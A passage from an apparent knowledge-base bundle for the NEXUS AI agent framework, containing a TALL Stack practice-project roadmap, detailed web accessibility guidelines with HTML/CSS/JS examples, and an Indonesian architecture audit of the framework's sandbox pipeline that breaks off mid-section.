   Procurement management app
   Legal document workflow
   Enterprise approval workflow
   Internal ticketing system
   Corporate knowledge base
   Enterprise document management
## 10. Expert-Level TALL Stack Challenges [Tags: expert, architecture, ddd, event-sourcing, phase-4]
    Multi-tenant SaaS architecture
    Event sourcing implementation
    CQRS dashboard system
    Laravel package generator
    Custom Livewire component library
    Full websocket collaboration suite
    Headless CMS with Livewire admin
    Workflow automation engine
    Visual automation builder
    AI-powered productivity platform

Roadmap Penguasaan TALL Stack

Kalau tujuanmu menjadi “master”, urutan pengerjaan project sangat penting.

Phase 1 — Fundamental Laravel + Livewire

Kerjakan:

1–10
Fokus:
CRUD
validation
authentication
migrations
Eloquent
Blade
Livewire basic state
Phase 2 — Intermediate Reactive UI

Kerjakan:

31–40
61–70
Fokus:
Livewire lifecycle
Alpine interop
realtime UX
event system
reusable components
optimization
Phase 3 — SaaS & Business Logic

Kerjakan:

41–60
Fokus:
subscription
payment
queues
notifications
policies
caching
scaling
Phase 4 — Enterprise Architecture

Kerjakan:

81–100
Fokus:
multi-tenancy
DDD
CQRS
event sourcing
websocket
testing strategy
CI/CD
deployment
observability

Stack Tambahan yang Sangat Direkomendasikan

Backend
Laravel Horizon
Laravel Reverb
Redis
Meilisearch
Elasticsearch
Frontend
Alpine Persist
Alpine Morph
Flux UI / Volt
Infra
Docker
Nginx
CI/CD GitHub Actions
VPS deployment
S3 object storage
Testing
Pest PHP
Laravel Dusk
---

## 🤖 Nexus Project Selection Protocol
Untuk memulai simulasi mandiri (Recursive Evolution), Nexus Agent harus mengikuti langkah berikut:
1. **Target Identification**: Pilih nomor proyek dari daftar di atas berdasarkan Phase yang sedang diuji.
2. **Tag Matching**: Pastikan `EvolutionPiper.js` memiliki template scenario yang cocok dengan `[Tags]` kategori tersebut.
3. **Sandbox Spawning**: Jalankan perintah `piper.spawnSandbox(project_name, tags)` untuk membuat lab pengujian.
4. **Learning Absorption**: Setelah siklus selesai, gunakan `Distiller` untuk menyerap pola kode TALL Stack yang berhasil diimplementasikan ke dalam HUB Utama.

> **Status**: Machine-Readable | **Last Ingested**: 10/05/2026


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_ACCESSIBILITY.MD

# Accessibility Coding Guidelines
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide provides actionable DOs and DON'Ts for AI coding agents to ensure web applications are accessible to all users, including those using assistive technologies.

Keep these principles in mind throughout:

- **Accessibility is the minimum, not the ceiling.** Conformance to standards is the floor; aim for genuine usability.
- **Patterns are use-case specific.** No checklist replaces real testing — including testing with disabled users — to confirm a given implementation is actually accessible in context.

## 1. Content Navigability and Structure

### Actionable Guidelines

#### DOs
- **Place all content within landmarks**: Wrap the page in `<header>`, `<nav>`, `<main>`, `<aside>`, and `<footer>` so assistive-tech users can jump between regions.
- **Structure main content with headings**: Use `<h1>`–`<h6>` sequentially (no jumping `<h1>` → `<h4>`) so screen-reader users get a navigable outline.
- **Use lists for repeated, contiguous content**: `<ul>`/`<ol>` give assistive tech a count up front and let users skip the entire group.
- **Provide skip links** prior to repeated content like site headers with navigation or long/infinite lists, so that keyboard users can easily bypass them. Make sure the target is focusable (e.g. `<main id="content" tabindex="-1">`).
- **Semantic Tables**: Use `<caption>` and `<th scope="col">` (or `<th scope="row">`) for data tables.

#### DON'Ts
- **Don't use fake headings**: Never style `<div>` or `<span>` to look like headings without standard `<h1>`–`<h6>` tags.
- **Don't place headings inside `<summary>`, and avoid relying on headings inside `<details>` content**: Headings inside `<summary>` may be hidden from screen-reader heading lists and heading-navigation shortcuts entirely; headings inside `<details>` content are only reachable via heading navigation when the disclosure is open.
  - **Caveat**: If a heading must act as a disclosure trigger, use a more robust alternative to `<details>`/`<summary>` instead, e.g. an accordion or a disclosure implemented with ARIA where the heading wraps the button.
- **Don't use tables for layout**: Use CSS Grid/Flexbox for visual layouts.
- **Don't overuse landmarks**: Too many landmarks dilute their value. In particular, avoid labeling a `<section>` (which turns it into a `region` landmark) — `region` should be a last resort when no other landmark fits.

### Code Examples

```html
<!-- Good: Semantic landmarks, heading hierarchy, skip link -->
<header>
  <a href="#content" class="skip-link visually-hidden">Skip to content</a>
  <nav aria-label="Primary">
    <ul>
      <li><a href="/">Home</a></li>
    </ul>
  </nav>
</header>
<main id="content" tabindex="-1">
  <h1>Platform Dashboard</h1>
  <section>
    <h2>User Statistics</h2>
    <table>
      <caption>Monthly active users</caption>
      <tr>
        <th scope="col">Month</th>
        <th scope="col">Users</th>
      </tr>
      <tr>
        <td>January</td>
        <td>12,000</td>
      </tr>
    </table>
  </section>
</main>
```

## 2. Semantic HTML and ARIA

### Actionable Guidelines

#### DOs
- **Prefer HTML elements and attributes to ARIA**: A native element comes with the right role and behavior. `<button>` already implies `role="button"`; `required` already implies `aria-required`.
- **Match ARIA implementations to actual behavior**: If you set `role="tab"`, the element must behave like a tab — including keyboard interactions. Many ARIA patterns can't be implemented in CSS alone and need JavaScript.
- **Be deliberate about `disabled` vs `aria-disabled`**: `disabled` removes the element from the focus order entirely (and `tabindex="0"` won't bring it back), which is often wrong for toolbar buttons or links. `aria-disabled="true"` keeps the element focusable so users can land on it and learn it's disabled.

#### DON'Ts
- **Don't use ARIA when native HTML exists**: Avoid `<div role="button">` or `<a role="button">` if `<button>` works.
- **Don't add redundant ARIA roles or properties**: Avoid `<ul role="list">`, `<nav role="navigation">`, or `<input required aria-required="true">`.
  - **Caveat**: Safari removes list semantics from `<ul>`/`<ol>` outside `<nav>` when `list-style: none` or `display: flex`/`grid` is applied. In that case `role="list"` is required to restore them.
- **Don't assume custom elements have no ARIA**: Custom elements can attach ARIA via `ElementInternals`, which some automated test tools can't see — so the absence of `role`/`aria-*` attributes in markup doesn't prove the element has no semantics. Verify with the browser's accessibility-tree inspector.

## 3. Accessible Names and Descriptions

Every interactive element and some landmarks need an accessible name, and many benefit from an accessible description. Names are short and identify the element; descriptions add context.

### Actionable Guidelines

#### DOs
- **Prefer native naming mechanisms**: `<label>` for form controls, `<caption>` for `<table>`, `<legend>` for `<fieldset>`, `<figcaption>` for `<figure>`.
- **Explicitly associate `<label>` with its control via `for`/`id`**, even when nesting the input inside the label — explicit association improves assistive-tech support.
- **Prefer `aria-labelledby` over `aria-label` when a visible label exists**: avoids duplication, improves maintainability, and translates better.
- **Prefer to reuse the same accessible name for hyperlinks that share an `href`.**
- **Use visually hidden text to disambiguate controls** that look identical visually but do different things (e.g. multiple "Edit" buttons in a list).

#### DON'Ts
- **Don't put `aria-label`/`aria-labelledby` on elements that shouldn't be named** — e.g. plain `<div>`, `<span>`, or custom elements without a role. Custom elements may have an implicit role set via `ElementInternals`, so the absence of a `role` attribute isn't conclusive.
- **Don't reuse an accessible name across controls with different effects in the same view** (close buttons for two different open dialogs are fine because only one is reachable at a time; multiple “Edit” buttons for different content is not).
- **Don't reuse an accessible name across hyperlinks pointing to different `href`s.**
- **Don't pack descriptions, error messages, or instructions into the label.**
- **Don't repeat state already exposed via ARIA** (`aria-expanded`, `aria-checked`, `aria-selected`, `aria-pressed`) inside the accessible name — it creates redundancy and ambiguity.
- **Don't include the role name in the label**: `<nav aria-label="Primary navigation">` reads as "Primary navigation navigation."
- **Don't use `title` or `placeholder` as a naming mechanism.**
- **Don't include interactive elements in an `aria-describedby` target** unless their text content reads sensibly as a description on its own (e.g. if a link’s text is the same as how it’s labelled elsewhere, it can be included within a description).

### Code Example: Visually Hidden Utility

A `.visually-hidden` utility lets you provide text for screen readers without rendering it visually. It's commonly used for skip links, additional context on icon-only buttons, and supplementary labels.

```css
/* Hides content visually but keeps it in the accessibility tree.
   :focus-within / :active opt elements out — useful for skip links and
   any focusable content wrapped in this class. */
.visually-hidden:where(:not(:focus-within, :active)) {
  position: absolute !important;
  clip-path: inset(50%) !important;
  overflow: hidden !important;
  width: 1px !important;
  height: 1px !important;
  margin: -1px !important;
  padding: 0 !important;
  border: 0 !important;
  white-space: nowrap !important;
}
```

When the hidden content is focusable (skip links, focus-receiving wrappers), the `:focus-within`/`:active` exception lets it become visible. Style the visible state per situation, e.g. a skip link to the main content typically wants fixed positioning at the top-left of the viewport so the rest of the page doesn't shift.

## 4. Document Metadata and Language

### Actionable Guidelines

#### DOs
- **Declare Visual Language**: Always set `<html lang="en">` (or appropriate code).
- **Unique Page Titles**: Front-load unique context in `<title>` (e.g., `Page Topic | Site Name`).
- **Inline Language Switches**: Use `lang="..."` for block quotes or text in different languages.
- **IFrame Titles**: Always provide a descriptive `title="..."` for `<iframe>` elements.
- **Update document title on Page Transitions in SPAs**: Shift focus to updated titles.

#### DON'Ts
- **Don't Disable iframe Scrolling**: Avoid `scrolling="no"` (deprecated) or `overflow: hidden` on iframes. Users who zoom in or enlarge text need to scroll to reach content that overflows.

### Code Examples

```html
<!-- Good: Distinct title and language declaration -->
<html lang="en">
<head>
  <title>Analytics Reports | Guidance Platform</title>
</head>
<body>
  <p>The motto is <span lang="la">"Carpe diem"</span>.</p>
  <iframe title="Interactive Sales Chart" src="/chart"></iframe>
</body>
</html>
```

## 5. Keyboard and Focus Management

### Actionable Guidelines

#### DOs
- **Logical Tab Order**: Ensure tab order matches visual layouts (top-to-bottom).
- **Visible Focus Indicators**: Always style `:focus-visible` states explicitly. If disabling defaults, provide overrides with sufficient contrast.
- **Custom Trigger Keyboards**: Attach Enter/Space handlers for custom simulated interactive elements. When implementing a custom keyboard handler for button-like elements, `Enter` should be a `keydown` handler and `Space` should be a `keyup` handler (matching native `<button>` behavior where `Enter` repeats and `Space` triggers on release).
- **Use `tabindex` deliberately**: Anything focusable — by keyboard or programmatically — should have an implicit or explicit ARIA role, so don't make every element focusable. When focus is needed, choose `tabindex="0"` to add the element to the tab order or `tabindex="-1"` to make it programmatically focusable only (e.g., a skip-link target).
- **Manage Toggle States**: Utilize `aria-expanded` and `aria-pressed` to communicate toggle states for custom controls.

#### DON'Ts
- **Don't disable outlines without replacements**: Avoid `outline: none` without styling alternatives.
- **Don't use Positive Tabindex values**: Never use `tabindex="1"` or greater.
- **Don't hide interactive elements from screen readers**: Avoid `aria-hidden="true"` or `role="presentation"` on elements that can receive focus.

### Code Examples

```css
/* Good: High contrast focus border */
:where(a:any-link, button):focus-visible {
  outline: 3px solid #ff0055;
  outline-offset: 3px;
}
```

```html
<!-- Good: Skip to main content -->
<a href="#content" class="skip-link">Skip to main content</a>
<main id="content" tabindex="-1">...</main>
```

```javascript
// Good: Keyboard handlers for complex custom widgets (e.g., Tree items, tabs).
// NOTE: This pattern applies ONLY to non-standard UI where no native HTML tag exists.
// Always prioritize native <button> or <input> elements for standard interactions.
// Elements MUST have the appropriate ARIA role (e.g., role="treeitem" or role="tab").
customWidget.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    toggleWidgetState();
  }
  if (e.key === ' ') {
    e.preventDefault(); // Prevent page scrolling on Spacebar keydown
  }
});

customWidget.addEventListener('keyup', (e) => {
  if (e.key === ' ') {
    toggleWidgetState();
  }
});

function toggleWidgetState() {
  // E.g., Manage toggle/expanded states for custom controls
  const isExpanded = customWidget.getAttribute('aria-expanded') === 'true';
  customWidget.setAttribute('aria-expanded', !isExpanded);
}
```

## 6. Alternate Text and Media

### Actionable Guidelines

#### DOs
- **Informative Visual Descriptions**: Describe the purpose of the image (e.g., "Search", not "Magnifying glass").
- **Empty Alt properties for decorative visuals**: Use `alt=""` to remove decorative images from the accessibility tree so they aren't announced.
- **Synchronous Captions for videos**: Supply WebVTT captions for video tracks.
- **Transcripts for audio**: Provide text transcripts for purely audio podcasts.
- **Informative View Descriptions for inline SVGs**: Apply `role="img"` and a nested `<title>` tag for informative visuals.
- **Decorative SVGs removal**: Apply `aria-hidden="true"` to remove decorative SVGs from reading flows.
- **Long descriptions for complex images**: Use `<figure>`/`<figcaption>` or `aria-describedby` for charts and infographics.
- **Provide data tables as alternatives**: Consider providing semantic data tables as accessible alternatives for charts and other complex data visualizations.

#### DON'Ts
- **Don't use clichéd prefixes**: Avoid "Image of..." or "Picture of...".
- **Don't use underscores in filenames**: Use dashes if the filename might be announced as fallback.

### Code Examples

```html
<!-- Decorative -->
<img src="divider.png" alt="">

<!-- Inline Decorative SVG (remove from tab flow) -->
<svg aria-hidden="true" viewBox="0 0 24 24">
  <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
</svg>

<!-- Informative (Functional) -->
<a href="/search">
  <img src="glass.png" alt="Search the platform">
</a>

<!-- Video with Captions tracks -->
<video controls>
  <source src="intro.mp4" type="video/mp4">
  <track src="caps.vtt" kind="captions" srclang="en" label="English">
</video>

<!-- Complex graph with figcaption -->
<figure>
  <img src="chart.png" alt="Sales growth graph 2024.">
  <figcaption>Sales grew 20% in Q3 due to new platform launch.</figcaption>
</figure>

<!-- Audio with expandable transcript details -->
<audio controls src="podcast.mp3" aria-details="podcast-transcript"></audio>
<details id="podcast-transcript">
  <summary>View Transcript</summary>
  <div class="transcript-content">
    Welcome to the show...
  </div>
</details>
```

### Content Visibility Decision Matrix

| Intent | Visual | Screen Reader | Focusable | Structural Pattern |
| :--- | :--- | :--- | :--- | :--- |
| **Visible to all** | Yes | Yes | Yes | Standard rendering |
| **Screen Reader only** | No | Yes | Yes (if interactive) | Visually hidden utility (e.g. `.visually-hidden`) |
| **Visual only** | Yes | No | No | `aria-hidden="true"` / `role="presentation"` |
| **Hidden for all** | No | No | No | `hidden` attribute / `display: none` |

**Heuristic Rule**: If an element can receive keyboard focus, it must not be hidden via `aria-hidden="true"`.

## 7. Forms and Input Controls

### Actionable Guidelines

#### DOs
- **Connect Labels Programmatically**: Use `<label for="id">` linked to `<input id="id">`.
- **Use Autocomplete**: Set valid standard `autocomplete` options (e.g., `"email"` or `"given-name"`) for user profiles.
- **Link hints to inputs via `aria-describedby`**: Associate help text with inputs, and place the hint above the input so autocomplete popovers don't cover it during editing.
- **Announce dynamic errors via live regions**: Use `aria-live` or shift focus to error lists.
- **Provide form validation constraints**: Use `required` (or `aria-required="true"` only when `required` isn't applicable) to signal mandatory inputs.

#### DON'Ts
- **Don't use placeholders as labels**: Placeholders are not persistent labels.
- **Don't trigger context shifts on focus changes**: Avoid auto-submitting forms or jumping pages on focus change events alone.

### Code Examples

```html
<!-- Good: Semantic forms with hints for passwords -->
<form>
  <label for="pwd">Password:</label>
  <span id="pwd-hint">Must contain at least 8 characters.</span>
  <input id="pwd" type="password" aria-describedby="pwd-hint" autocomplete="current-password" required>
</form>
```

## 8. Live Regions

Live regions let assistive tech announce content updates that aren't tied to navigation or focus changes. They're easy to misuse — too many regions, or noisy ones, quickly become spam for screen-reader users.

### Live Region Urgency Table

| Urgency | Visual Analogue | `aria-live` Value | Behavioral Impact | Example |
| :--- | :--- | :--- | :--- | :--- |
| **Critical** | Modal / Alert | `assertive` (or `role="alert"`) | Interrupts immediately, clears speech queue | Session timeout, API failure |
| **Standard**| Toast / Banner | `polite` | Announces at next graceful break | Search results, "Saved" status |
| **Passive**  | Silent text | `off` | Only if user navigates to it | Live character count |

**Heuristic Rule**: Use `assertive` only for critical, time-sensitive updates that require immediate attention or prevent safe continuation (e.g., data loss, session timeouts, or network drops).

### Actionable Guidelines

#### DOs
- **Centralize live regions for non-visible announcements**: A single `polite` region and a single `assertive` region per page (with whatever `aria-atomic` configuration you need) keeps announcements consistent and easier to maintain. Many frameworks ship their own announcer abstraction — use it.
- **Debounce frequently-changing regions**: If a region can update many times per second (e.g. a combobox's result count as the user types), debounce so users aren't spammed.
- **Delay slightly when other announcements may collide**: When the user is typing or focus is being managed, a small delay before announcing keeps live-region updates from overlapping other speech.

#### DON'Ts
- **Don't use live regions for interstitial states** like "Loading…" or "Updating…" unless they're meaningfully informative — they usually just create noise.
- **Don't add live-region updates to inert DOM**: When dialogs open or sections become `inert`, queued or debounced messages can end up unannounced — or announced from DOM the user can't reach. Coordinate live-region updates with dialog/inert state changes.

### Code Example

```html
<!-- Session Timeout Warning with controls -->
<div role="alert" aria-live="assertive" class="timeout-warning">
  Your session will expire in 2 minutes. 
  <button onclick="extendSession()">Extend Session</button>
</div>
```

## 9. Color, Contrast, and Typography

### Actionable Guidelines

#### DOs
- **Minimum contrast standards**: Maintain 4.5:1 for normal text and 3:1 for large text or icons.
- **Ensure non-text contrast standards**: Maintain a minimum contrast ratio of 3:1 for user interface component boundaries and states.
  - This includes visual elements (borders, backgrounds, box-shadows, underlines) that form the boundary or indicate the presence of a UI component (e.g., input field borders).
  - This also includes visual elements indicating active states within a component (e.g., checkbox checkmarks or switch thumbs).
  - **Caveat**: Meeting 3:1 non-text contrast can challenge minimalistic designs. Soft gradients or subtle inset/outset shadows can soften visual boundaries while satisfying accessibility requirements.
- **Use multiple state indicators**: Do not denote success/errors ONLY with color. Use icons or text.
- **Relative font size units**: Use `rem` or `em` for font sizes instead of `px`.
- **Consistent or Start alignment**: Avoid `justify` alignment as it can be more difficult to read.
- **Avoid long lines of text**: Cap paragraph blocks to a maximum of 80 characters width.
- **Support user zoom preferences**: Allow users to resize text up to 200% without loss of content or functionality.
- **Support light and dark color schemes**: Honor `@media (prefers-color-scheme: dark)` and pair it with the `color-scheme` CSS property so form controls, scrollbars, and other UA-rendered surfaces match.
- **Use `prefers-contrast` only when warranted**: Reach for `@media (prefers-contrast: more)` when the design uses low-contrast accents (e.g., subtle borders, muted secondary text) that need to be reinforced; most sites that already meet baseline contrast won't need it.

#### DON'Ts
- **Don't use color alone to indicate the presence of a user interface component or its state**: Use iconography and/or shape to help differentiate.
- **Don't use Justified Text Alignment**: Avoid `text-align: justify`.
- **Don't use Ornate fonts**: Omit cursive typefaces for main reading content.
- **Don't rely on all-caps for emphasis**: Prefer bolding for visual emphasis, and use `<em>`/`<strong>` when the emphasis is semantic.
- **Limit emphasis overall**: Emphasis loses meaning when it's everywhere — apply it only where it changes how the content should be read.

### Code Examples

```css
/* Good: Relative sizing and line caps */
body {
  line-height: 1.5;
  text-align: start; /* Supports LTR and RTL */
}
article {
  max-width: 80ch; /* Caps line length to ~80 characters for readability */
}
```

```html
<!-- Good: Denotes state without colors alone -->
<div class="error-msg">
  <span aria-hidden="true">❌</span>
  <span>The password entered was invalid.</span>
</div>
```

```css
/* Dark Mode support variables */
:root {
  --bg-color: #ffffff;
  --text-color: #212529;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg-color: #121212;
    --text-color: #f8f9fa;
  }
}
```

## 10. Motions and Preferences

### Actionable Guidelines

#### DOs
- **Support Reduced Motion media queries**: Support `@media (prefers-reduced-motion: reduce)` media queries.
- **Provide Pause mechanism**: Allow users to stop auto-running carousels banners or other persistent animations.
- **Default to static views**: Consider defaulting to static states and allowing users to opt-in to motion.

#### DON'Ts
- **Don't exceed flash limits (three per second)**: Never include rapid light-to-dark flashing. Such effects can cause seizures.

### Code Examples

```css
/* Good: Dampen spin states for reduced motion queries */
@media (prefers-reduced-motion: reduce) {
  .spinner {
    animation: none;
    opacity: 0.5;
  }
}
```

## 11. Modals and Native Dialogs

Modern browsers provide native solutions for creating modal dialogs which avoid the need for focus traps, managing the accessibility of outside content, ensuring the content is on top, and dimming the background content — all of which can be error prone and require heavy JavaScript event tracking to maintain.

### Actionable Guidelines

#### DOs
- **Use the Native `<dialog>` Element**: Invoke the dialog using the `.showModal()` method to open it in a modal state. When in a modal state, the browser sets outside content as inert (i.e. the outside content is hidden from the accessibility tree and cannot be interacted with nor be focused).
- **Use the `inert` Attribute for Custom Overlays**: When `<dialog>` cannot be used (e.g., some non-modal overlays, framework constraints, or layouts where `<dialog>`'s top-layer/positioning behavior conflicts with the design), apply `inert` to outside content to ensure it cannot be interacted with by keyboard, pointer, or assistive technology. This requires structuring elements in such a way that the custom overlay is not a descendant of the element with `inert` set on it.

#### DON'Ts
- **Don't implement focus traps for native modal dialogs**: When a `<dialog>` element is opened in a modal state, browsers set outside content as inert which is sufficient for ensuring only the dialog’s content can be focused.

### Code Examples

**HTML & JS: Native `<dialog>` with standard close events**
```html
<!-- Dialog opens natively with showModal() and locks focus -->
<button id="open-btn">Open Dialog</button>

<dialog id="accessible-modal" aria-labelledby="title-id">
  <h2 id="title-id">Account Settings</h2>
  <p>Update your details here.</p>
  <button onclick="this.closest('dialog').close()">Close Dialog</button>
</dialog>

<script>
  document.getElementById('open-btn').addEventListener('click', () => {
    document.getElementById('accessible-modal').showModal();
  });
</script>
```

## 12. Testing Validations

### Actionable Guidelines

#### DOs
- **Run Automated checks via axe-core or Lighthouse audits**: Catch missing alt texts or low contrasts (e.g., via Lighthouse in Chrome DevTools MCP).
- **Validate Sequential Navigations using keyboards alone**: Using only keyboard shortcuts, such as Tab/Shift+Tab, arrow keys, Enter, Space, and Esc, confirm every interactive element is reachable and operable, and that focus never gets stuck.
- **Test on Screen Readers with calibrated browsers**: Rely on standard bindings (e.g., JAWS with Chrome, NVDA with Firefox, Narrator with Edge, VoiceOver with Safari on macOS and iOS, TalkBack with Chrome for Android).

#### DON'Ts
- **Don't rely purely on scores**: A 100% score does not guarantee real usability.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_AI_ARCHITECTURE_ANALYSIS.MD

# NEXUS AI — Analisis Arsitektur & Audit Pipeline Sandbox
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Versi Dokumen:** 1.0  
**Tanggal:** 18 Mei 2026  
**Scope:** Full architecture review + extreme sandbox pipeline inspection  
**Fokus Utama:** Apakah output akhir adalah web app yang bisa digunakan, dan apakah knowledge tersimpan ke memory inti NEXUS.

---

## Daftar Isi

1. [Ringkasan Eksekutif](#1-ringkasan-eksekutif)
2. [Peta Arsitektur Keseluruhan](#2-peta-arsitektur-keseluruhan)
3. [Temuan: Kekuatan Arsitektur](#3-temuan-kekuatan-arsitektur)
4. [Temuan: Risiko & Bug Kritis](#4-temuan-risiko--bug-kritis)
5. [Audit Ekstrem: Sandbox Pipeline End-to-End](#5-audit-ekstrem-sandbox-pipeline-end-to-end)
6. [Gap Analysis: "Web App yang Bisa Digunakan"](#6-gap-analysis-web-app-yang-bisa-digunakan)
7. [Gap Analysis: "Memory Inti Nexus"](#7-gap-analysis-memory-inti-nexus)
8. [Rekomendasi Perbaikan Prioritas](#8-rekomendasi-perbaikan-prioritas)
9. [Peta Jalan (Roadmap)](#9-peta-jalan-roadmap)

---

## 1. Ringkasan Eksekutif

NEXUS AI adalah framework orkestrasi multi-agent berbasis Node.js yang dirancang untuk membangun, mengaudit, dan mengevolusi project TALL Stack (Laravel + Livewire + Alpine.js + Tailwind CSS) secara otonom. Arsitekturnya terstruktur dengan baik, namun terdapat **6 gap kritis** yang menyebabkan dua tujuan utama — menghasilkan web app yang dapat digunakan dan menyimpan knowledge ke memory inti — **belum terpenuhi secara penuh**.

**Status Pipeline Saat Ini:**
- `spawnRealLaravel()` → **SENGAJA di-throw Error** (belum diimplementasikan)
- `WorktreeManager.isActive` → **hardcoded `false`** (Git isolation tidak aktif)
- `docker-compose.yml` → **tidak mendefinisikan Redis service** (memory backbone hilang)
- `KnowledgePhase.harvest()` → **berjalan, tapi sumber data seringkali kosong** karena sandbox tidak menghasilkan dokumentasi

---

## 2. Peta Arsitektur Keseluruhan

```
┌─────────────────────────────────────────────────────────────────┐
│  ENTRY LAYER                                                     │
│  cli.js ──► agent/main.js                                        │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  CORE ORCHESTRATOR: NexusEngine                                  │
│  State Machine: INIT → PROCESSING → EXECUTING → LOGGING → END   │
└──────────┬──────────────┬──────────────┬────────────────────────┘
           │              │              │
    ┌──────▼──────┐ ┌─────▼──────┐ ┌───▼──────────────────────┐
    │ Orchestrator│ │EvolutionP. │ │MemoryPipeline + Distiller│
    │ DLQ + Retry │ │Spawn/Harv. │ │Redis + KnowledgeHUB      │
    └──────┬──────┘ └─────┬──────┘ └──────────────────────────┘
           │              │
    ┌──────▼──────────────▼───────────────────────────────────┐
    │  PHASES PIPELINE (Sequential)                            │
    │  1. AuditPhase   → 6 specialist scanner, parallel-2     │
    │  2. PlanningPhase → findings → tasks → plan JSON        │
    │  2.5 ImplementationPhase → LLM generates PHP code       │
    │  3. ExecutionPhase → Modifier applies FILE_REPLACE etc  │
    │  4. VerificationPhase → Validator checks each task      │
    │  5. KnowledgePhase → Harvest → MemoryPipeline → HUB    │
    └─────────────────────────────────────────────────────────┘
           │
    ┌──────▼───────────────────────────────────────────────────┐
    │  INTELLIGENCE LAYER                                       │
    │  LocalIntelligence (Ollama: qwen3:8b)                    │
    │  Circuit Breaker + Task Whitelist + Prompt Size Guard    │
    └──────────────────────────────────────────────────────────┘
           │
    ┌──────▼───────────────────────────────────────────────────┐
    │  EXTERNAL SERVICES                                        │
    │  Ollama (LLM lokal) │ Redis (vector) │ Docker │ TALL Stack│
    └──────────────────────────────────────────────────────────┘
```

---

## 3. Temuan: Kekuatan Arsitektur

### 3.1 State Machine yang Eksplisit
`NexusEngine` mendefinisikan 6 lifecycle states secara eksplisit (`INIT`, `PROCESSING`, `EXECUTING`, `LOGGING`, `COMPLETED`, `FAILED`). Ini memudahkan debugging dan mencegah partial-state corruption.

### 3.2 Dead Letter Queue (DLQ) dengan Persistensi Disk
`Orchestrator` menyimpan task gagal ke `logs/dead_letter_queue.json` dengan retry otomatis ×3. Ini adalah pola production-grade yang jarang ditemukan di framework eksperimental sejenis.

### 3.3 Circuit Breaker pada LocalIntelligence
`LocalIntelligence` mengimplementasikan circuit breaker (CLOSED → OPEN → HALF_OPEN) untuk mencegah cascade failure saat Ollama overload. Dikombinasikan dengan TTL availability cache (60s sukses / 10s gagal), ini mencegah blocking calls yang sia-sia.

### 3.4 Guardrail EvolutionPiper
Hard cap `MAX_EVOLUTION_CYCLES = 25` dan `MAX_SESSION_MINUTES = 120` dengan persistensi ke `.evolution_state.json` adalah safety mechanism yang kritis untuk sistem otonom. Mencegah infinite loop yang bisa menghabiskan resource.

### 3.5 Path Traversal Protection di SandboxExecutor
`SandboxExecutor` menggunakan `path.resolve() + startsWith(allowedDir)` untuk mencegah path traversal, dan memvalidasi plugin terhadap `manifest.json`. Ini menutup vektor serangan yang umum.

### 3.6 Versioned Write di MemoryPipeline
Sebelum overwrite file knowledge, `MemoryPipeline.versionedWrite()` membuat backup bernama `basename_backup_{timestamp}.ext`. Tidak ada data knowledge yang hilang tanpa backup.

### 3.7 Task Whitelist di LocalIntelligence
Hanya 10 task type yang diizinkan memanggil LLM. Ini mencegah prompt injection atau penyalahgunaan API Ollama dari task yang tidak terdefinisi.

### 3.8 Parallel Audit dengan Concurrency Limit
`AuditPhase` menggunakan `ParallelRunner` dengan batas 2 concurrent specialist untuk mencegah OOM pada hardware terbatas (Ryzen 2500U, 8GB RAM). Ini adalah design decision yang sadar dan tepat.

### 3.9 Dynamic APP_KEY Generation
`EvolutionPiper.spawnSandbox()` menggunakan `crypto.randomBytes(32).toString('base64')` untuk APP_KEY, bukan hardcoded value. Ini menghindari security vulnerability umum pada project Laravel template.

---

## 4. Temuan: Risiko & Bug Kritis

### 🔴 KRITIS-1: `spawnRealLaravel()` Sengaja Di-throw
**File:** `agent/core/EvolutionPiper.js`  
**Kode:**
```javascript
async spawnRealLaravel(name) {
    throw new Error(
        'spawnRealLaravel: Not yet implemented. ' +
        'Use spawnSandbox(name, "crud") sebagai gantinya...'
    );
}
```
**Dampak:** Tidak ada project Laravel nyata yang pernah di-scaffold. Sandbox 'crud' hanya membuat 4 file stub (Controller, routes, migration, .env). Tidak ada `composer install`, tidak ada `npm install`, tidak ada server yang berjalan. **Output akhir bukan web app yang bisa digunakan.**

**Fix:** Implementasikan `composer create-project laravel/laravel` via `spawn()` dengan penanganan error dan timeout.

---

### 🔴 KRITIS-2: `WorktreeManager.isActive = false` (Hardcoded)
**File:** `agent/core/WorktreeManager.js`  
**Kode:**
```javascript
// ⛔ GUARD: Set ke true hanya setelah git commands diuji
this.isActive = false;
```
**Dampak:** Seluruh Git isolation layer tidak aktif. Perubahan dari sandbox berbeda bisa saling overwrite. Tidak ada branching, tidak ada merge strategy. Saat 100 project dijalankan paralel, race condition pada filesystem tidak terlindungi.

---

### 🔴 KRITIS-3: Redis Tidak Ada di `docker-compose.yml`
**File:** `docker-compose.yml`  
**Kondisi:** Hanya `nexus-ai` service yang didefinisikan. Tidak ada Redis service.
```yaml
services:
  nexus-ai:
    build: .
    # ... tidak ada redis service
```
**Dampak:** `RedisMemory` akan selalu gagal terkoneksi saat dijalankan via Docker. Seluruh vector memory backbone tidak tersedia. `MemoryPipeline` akan jatuh ke mode degraded tanpa fallback eksplisit.

---

### 🔴 KRITIS-4: `ImplementationPhase` Tidak Memanggil `artisan` atau `composer`
**File:** `agent/core/phases/ImplementationPhase.js`  
**Kondisi:** Phase ini hanya menulis file PHP (Model, Migration, Livewire Component) ke filesystem. Tidak ada:
- `composer install` untuk install dependencies
- `php artisan migrate` untuk membuat tabel database
- `php artisan key:generate` untuk APP_KEY
- `npm install && npm run build` untuk Vite/Tailwind compilation

**Dampak:** File PHP yang dihasilkan ada di folder yang benar, tapi aplikasi tidak bisa dijalankan karena tidak ada vendor directory, tidak ada database tables, dan tidak ada compiled assets.

---

### 🟡 SEDANG-5: Prompt 2MB Berpotensi Silent Truncation
**File:** `agent/prompts/internal/guru.md` (2.08MB), `orchestrator.md` (2.08MB), `pipeline-architect.md` (2.08MB)  
**Kondisi:** `LocalIntelligence` punya `MAX_PROMPT_CHARS = 30000` (~7500 tokens), tapi file prompt ini jauh lebih besar.
```javascript
const MAX_PROMPT_CHARS = 30000;
// ...
if (prompt.length > MAX_PROMPT_CHARS) {
